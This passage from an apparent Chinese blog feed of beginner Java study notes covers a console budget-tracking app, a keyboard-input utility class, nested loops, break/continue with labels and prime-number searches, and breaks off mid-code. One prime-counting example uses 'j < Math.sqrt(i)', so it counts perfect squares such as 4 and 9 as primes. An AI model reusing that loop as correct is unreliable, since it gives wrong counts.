class="variable">details</span> <span class="operator">=</span> <span class="string">&quot;收支\t账户金额\t收支金额\t说    明\n&quot;</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">balance</span> <span class="operator">=</span> <span class="number">10000</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (isFlag)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;-----------------家庭收支记账软件-----------------\n&quot;</span>);</span><br><span class="line">            System.out.println(<span class="string">&quot;                    1 收支明细&quot;</span>);</span><br><span class="line">            System.out.println(<span class="string">&quot;                    2 登记收入&quot;</span>);</span><br><span class="line">            System.out.println(<span class="string">&quot;                    3 登记支出&quot;</span>);</span><br><span class="line">            System.out.println(<span class="string">&quot;                    4 退    出\n&quot;</span>);</span><br><span class="line">            System.out.print(<span class="string">&quot;                    请选择(1-4)：&quot;</span>);</span><br><span class="line">            <span class="comment">//获取输入</span></span><br><span class="line">            <span class="type">char</span> <span class="variable">selection</span> <span class="operator">=</span> Utility.readMenuSelection();</span><br><span class="line">            <span class="keyword">switch</span> (selection)&#123;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">                    <span class="comment">//1.收支明细</span></span><br><span class="line">                    System.out.println(<span class="string">&quot;-----------------当前收支明细记录-----------------&quot;</span>);</span><br><span class="line">                    System.out.println(details);</span><br><span class="line">                    System.out.println(<span class="string">&quot;--------------------------------------------------&quot;</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&#x27;2&#x27;</span>:</span><br><span class="line">                    <span class="comment">//2.登记收入</span></span><br><span class="line">                    System.out.print(<span class="string">&quot;本次收入金额：&quot;</span>);</span><br><span class="line">                    <span class="type">int</span> <span class="variable">addMoney</span> <span class="operator">=</span> Utility.readNumber();</span><br><span class="line">                    System.out.print(<span class="string">&quot;本次收入说明：&quot;</span>);</span><br><span class="line">                    <span class="type">String</span> <span class="variable">addInfo</span> <span class="operator">=</span> Utility.readString();</span><br><span class="line"></span><br><span class="line">                    balance += addMoney;</span><br><span class="line">                    details += (<span class="string">&quot;收入\t&quot;</span> + balance + <span class="string">&quot;\t\t&quot;</span> + addMoney + <span class="string">&quot;\t\t&quot;</span> + addInfo + <span class="string">&quot;\n&quot;</span>);</span><br><span class="line">                    System.out.println(<span class="string">&quot;---------------------登记完成---------------------\n&quot;</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&#x27;3&#x27;</span>:</span><br><span class="line">                    <span class="comment">//3.登记支出</span></span><br><span class="line">                    System.out.print(<span class="string">&quot;本次支出金额：&quot;</span>);</span><br><span class="line">                    <span class="type">int</span> <span class="variable">minusMoney</span> <span class="operator">=</span> Utility.readNumber();</span><br><span class="line">                    System.out.print(<span class="string">&quot;本次支出说明：&quot;</span>);</span><br><span class="line">                    <span class="type">String</span> <span class="variable">minusInfo</span> <span class="operator">=</span> Utility.readString();</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> (balance &gt;= minusMoney)&#123;</span><br><span class="line">                        balance -= minusMoney;</span><br><span class="line">                        details += (<span class="string">&quot;支出\t&quot;</span> + balance + <span class="string">&quot;\t\t&quot;</span> + minusMoney + <span class="string">&quot;\t\t&quot;</span> + minusInfo + <span class="string">&quot;\n&quot;</span>);</span><br><span class="line">                    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                        System.out.println(<span class="string">&quot;钱不够，付不了~~~&quot;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                    System.out.println(<span class="string">&quot;---------------------登记完成---------------------\n&quot;</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&#x27;4&#x27;</span>:</span><br><span class="line">                    <span class="comment">//4.退  出</span></span><br><span class="line">                    System.out.print(<span class="string">&quot;确认是否退出(Y/N)：&quot;</span>);</span><br><span class="line">                    <span class="type">char</span> <span class="variable">isExit</span> <span class="operator">=</span> Utility.readConfirmSelection();</span><br><span class="line">                    <span class="keyword">if</span> (isExit == <span class="string">&#x27;Y&#x27;</span>)&#123;</span><br><span class="line">                        isFlag = <span class="literal">false</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-别人写好的工具类"><a href="#2-别人写好的工具类" class="headerlink" title="2. 别人写好的工具类"></a>2. 别人写好的工具类</h3><h4 id="Utility-java"><a href="#Utility-java" class="headerlink" title="Utility.java"></a>Utility.java</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Utility.java</span></span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> Utility工具类：</span></span><br><span class="line"><span class="comment"> 将不同的功能封装为方法，就是可以直接通过调用方法使用它的功能，而无需考虑具体的功能实现细节。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Utility</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">Scanner</span> <span class="variable">scanner</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     用于界面菜单的选择。该方法读取键盘，如果用户键入’1’-’4’中的任意字符，则方法返回。返回值为用户键入字符。</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">char</span> <span class="title function_">readMenuSelection</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">char</span> c;</span><br><span class="line">        <span class="keyword">for</span> (; ; ) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> readKeyBoard(<span class="number">1</span>);</span><br><span class="line">            c = str.charAt(<span class="number">0</span>);</span><br><span class="line">            <span class="keyword">if</span> (c != <span class="string">&#x27;1&#x27;</span> &amp;&amp; c != <span class="string">&#x27;2&#x27;</span> &amp;&amp; c != <span class="string">&#x27;3&#x27;</span> &amp;&amp; c != <span class="string">&#x27;4&#x27;</span>) &#123;</span><br><span class="line">                System.out.print(<span class="string">&quot;选择错误，请重新输入：&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> c;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     用于收入和支出金额的输入。该方法从键盘读取一个不超过4位长度的整数，并将其作为方法的返回值。</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">readNumber</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">int</span> n;</span><br><span class="line">        <span class="keyword">for</span> (; ; ) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> readKeyBoard(<span class="number">4</span>);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                n = Integer.parseInt(str);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (NumberFormatException e) &#123;</span><br><span class="line">                System.out.print(<span class="string">&quot;数字输入错误，请重新输入：&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> n;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     用于收入和支出说明的输入。该方法从键盘读取一个不超过8位长度的字符串，并将其作为方法的返回值。</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">readString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> readKeyBoard(<span class="number">8</span>);</span><br><span class="line">        <span class="keyword">return</span> str;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     用于确认选择的输入。该方法从键盘读取‘Y’或’N’，并将其作为方法的返回值。</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">char</span> <span class="title function_">readConfirmSelection</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">char</span> c;</span><br><span class="line">        <span class="keyword">for</span> (; ; ) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> readKeyBoard(<span class="number">1</span>).toUpperCase();</span><br><span class="line">            c = str.charAt(<span class="number">0</span>);</span><br><span class="line">            <span class="keyword">if</span> (c == <span class="string">&#x27;Y&#x27;</span> || c == <span class="string">&#x27;N&#x27;</span>) &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                System.out.print(<span class="string">&quot;选择错误，请重新输入：&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> c;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> String <span class="title function_">readKeyBoard</span><span class="params">(<span class="type">int</span> limit)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">line</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (scanner.hasNext()) &#123;</span><br><span class="line">            line = scanner.nextLine();</span><br><span class="line">            <span class="keyword">if</span> (line.length() &lt; <span class="number">1</span> || line.length() &gt; limit) &#123;</span><br><span class="line">                System.out.print(<span class="string">&quot;输入长度（不大于&quot;</span> + limit + <span class="string">&quot;）错误，请重新输入：&quot;</span>);</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> line;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">
    &lt;div class=&quot;tag-plugin audio&quot;&gt;
    &lt;iframe src=&quot;//music.163.com/outchain/player?type=2&amp;id=1818128141&amp;auto=0&amp;height=32&quot; frameborder=&quot;no&quot;</summary>
      
    
    
    
    <category term="Java项目" scheme="https://www.bandao.ltd/categories/Java%E9%A1%B9%E7%9B%AE/"/>
    
    
    <category term="Java" scheme="https://www.bandao.ltd/tags/Java/"/>
    
    <category term="基础" scheme="https://www.bandao.ltd/tags/%E5%9F%BA%E7%A1%80/"/>
    
    <category term="项目" scheme="https://www.bandao.ltd/tags/%E9%A1%B9%E7%9B%AE/"/>
    
  </entry>
  
  <entry>
    <title>java学习笔记6</title>
    <link href="https://www.bandao.ltd/coding/java/note/6.html"/>
    <id>https://www.bandao.ltd/coding/java/note/6.html</id>
    <published>2021-11-28T17:01:00.000Z</published>
    <updated>2024-11-04T03:12:49.885Z</updated>
    
    <content type="html"><![CDATA[    <div class="tag-plugin audio">    <iframe src="//music.163.com/outchain/player?type=2&id=1861194866&auto=0&height=32" frameborder="no" border="0" marginwidth="0" marginheight="0" width=288px height=52>    </iframe>    </div>    <h2 id="1-嵌套循环的使用"><a href="#1-嵌套循环的使用" class="headerlink" title="1. 嵌套循环的使用"></a>1. 嵌套循环的使用</h2><h3 id="1-定义"><a href="#1-定义" class="headerlink" title="1. 定义"></a>1. 定义</h3><p>将一个循环结构 A 声明在另一个循环结构 B 的循环体中,就构成了嵌套循环</p><h3 id="2-java-代码"><a href="#2-java-代码" class="headerlink" title="2. java 代码"></a>2. java 代码</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ForForTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">5</span>; i++) &#123;</span><br><span class="line">            System.out.print(<span class="string">&quot;*&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; <span class="number">4</span>; j++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">5</span>; i++) &#123;</span><br><span class="line">                System.out.print(<span class="string">&quot;*&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            System.out.println();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*        i(行号)j(*的个数)</span></span><br><span class="line"><span class="comment">         *        11</span></span><br><span class="line"><span class="comment">         **            22</span></span><br><span class="line"><span class="comment">         ***        33</span></span><br><span class="line"><span class="comment">         ****        44</span></span><br><span class="line"><span class="comment">         *****        55</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">5</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt;= i; j++) &#123;</span><br><span class="line">                System.out.print(<span class="string">&quot;*&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            System.out.println();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*        i(行号)    j(*的个数)   规律：i + j = 5 换句话说：j = 5 - i;</span></span><br><span class="line"><span class="comment">         ****        1    4</span></span><br><span class="line"><span class="comment">         ***        2    3</span></span><br><span class="line"><span class="comment">         **         3            2</span></span><br><span class="line"><span class="comment">         *        4    1</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; <span class="number">4</span> - i; j++) &#123;</span><br><span class="line">                System.out.print(<span class="string">&quot;*&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            System.out.println();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-Tip"><a href="#3-Tip" class="headerlink" title="3. Tip"></a>3. Tip</h3><ol><li>内层遍历一遍，相当于外层循环一次</li><li>假设外层循环执行 m 次，内层循环执行 n 次。<br>此时内层循环的循环体一共执行了 m * n 次</li></ol><h3 id="4-九九乘法表"><a href="#4-九九乘法表" class="headerlink" title="4. 九九乘法表"></a>4. 九九乘法表</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">NineNineTable</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt;= <span class="number">9</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">1</span>; j &lt;= i; j++) &#123;</span><br><span class="line">                System.out.print(i + <span class="string">&quot;*&quot;</span> + j + <span class="string">&quot;=&quot;</span> + (i * j) + <span class="string">&quot;\t&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            System.out.println();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-break-continue-label-的基本使用"><a href="#2-break-continue-label-的基本使用" class="headerlink" title="2. break,continue,label 的基本使用"></a>2. break,continue,label 的基本使用</h2><h3 id="1-break-continue-的基本使用"><a href="#1-break-continue-的基本使用" class="headerlink" title="1. break,continue 的基本使用"></a>1. break,continue 的基本使用</h3><table><thead><tr><th align="center">break 和 continue</th><th align="center">使用范围</th><th align="center">循环中使用的作用(不同点)</th><th align="center">相同点</th></tr></thead><tbody><tr><td align="center">break:</td><td align="center">switch-case 循环结构中</td><td align="center">结束当前循环</td><td align="center">关键字后面不能声明执行语句</td></tr><tr><td align="center">continue:</td><td align="center">循环结构中</td><td align="center">结束当次循环</td><td align="center">关键字后面不能声明执行语句</td></tr></tbody></table><h3 id="2-java-代码-1"><a href="#2-java-代码-1" class="headerlink" title="2. java 代码"></a>2. java 代码</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BreakContinueTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>;i &lt;= <span class="number">10</span>;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(i % <span class="number">4</span> == <span class="number">0</span>)&#123;</span><br><span class="line">                <span class="keyword">break</span>;<span class="comment">//123</span></span><br><span class="line">                <span class="comment">//continue;//123567910</span></span><br><span class="line">                <span class="comment">//System.out.println(&quot;今晚迪丽热巴要约我！！！&quot;);</span></span><br><span class="line">            &#125;</span><br><span class="line">            System.out.print(i);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt;= <span class="number">4</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">1</span>; j &lt;= <span class="number">10</span>; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span>(j % <span class="number">4</span> == <span class="number">0</span>)&#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                System.out.print(j);</span><br><span class="line">            &#125;</span><br><span class="line">            System.out.println();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        label:<span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>;i &lt;= <span class="number">4</span>;i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">1</span>;j &lt;= <span class="number">10</span>;j++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(j % <span class="number">4</span> == <span class="number">0</span>)&#123;</span><br><span class="line">                    <span class="comment">//break label;//结束指定标识的一层循环结构</span></span><br><span class="line">                    <span class="keyword">continue</span> label;<span class="comment">//结束指定标识的一层循环结构当次循环</span></span><br><span class="line">                &#125;</span><br><span class="line">                System.out.print(j);</span><br><span class="line">            &#125;</span><br><span class="line">            System.out.println();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-求-100000-以内的所有质数的输出（逐渐优化）"><a href="#2-求-100000-以内的所有质数的输出（逐渐优化）" class="headerlink" title="2. 求 100000 以内的所有质数的输出（逐渐优化）"></a>2. 求 100000 以内的所有质数的输出（逐渐优化）</h2><h3 id="1-方法-1"><a href="#1-方法-1" class="headerlink" title="1. 方法 1"></a>1. 方法 1</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">PrimeNumberTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">isFlag</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">2</span>; i &lt;= <span class="number">100</span>; i++) &#123;        <span class="comment">//遍历100以内的自然数</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">2</span>; j &lt; i; j++) &#123;       <span class="comment">//j:被i去除</span></span><br><span class="line">                <span class="keyword">if</span> (i % j == <span class="number">0</span>)&#123;                <span class="comment">//i被j除尽</span></span><br><span class="line">                    isFlag = <span class="literal">false</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(isFlag == <span class="literal">true</span>)&#123;</span><br><span class="line">                System.out.println(i);</span><br><span class="line">            &#125;</span><br><span class="line">            isFlag = <span class="literal">true</span>;                      <span class="comment">//重置isFlag</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-方法-2"><a href="#2-方法-2" class="headerlink" title="2.方法 2"></a>2.方法 2</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">PrimeNumberTest1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">isFlag</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">count</span> <span class="operator">=</span> <span class="number">0</span>;<span class="comment">//记录质数的个数</span></span><br><span class="line"></span><br><span class="line">        <span class="type">long</span> <span class="variable">start</span> <span class="operator">=</span> System.currentTimeMillis();<span class="comment">//时间戳</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">2</span>; i &lt;= <span class="number">100000</span>; i++) &#123;     <span class="comment">//遍历100以内的自然数</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">2</span>; j &lt; Math.sqrt(i); j++) &#123;       <span class="comment">//j:被i去除</span></span><br><span class="line">                <span class="keyword">if</span> (i % j == <span class="number">0</span>)&#123;                <span class="comment">//i被j除尽</span></span><br><span class="line">                    isFlag = <span class="literal">false</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(isFlag == <span class="literal">true</span>)&#123;</span><br><span class="line">                <span class="comment">//System.out.println(i);</span></span><br><span class="line">                count++;</span><br><span class="line">            &#125;</span><br><span class="line">            isFlag = <span class="literal">true</span>;                      <span class="comment">//重置isFlag</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">long</span> <span class="variable">end</span> <span class="operator">=</span> System.currentTimeMillis();<span class="comment">//时间戳</span></span><br><span class="line">        System.out.println(<span class="string">&quot;质数的个数为：&quot;</span> + count);</span><br><span class="line">        System.out.println(<span class="string">&quot;所花费的时间为：&quot;</span> + (end - start));<span class="comment">//17110 - 优化一：break:1546 - 优化二：13</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-方法-3"><a href="#3-方法-3" class="headerlink" title="3. 方法 3"></a>3. 方法 3</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">PrimeNumberTest2</span> 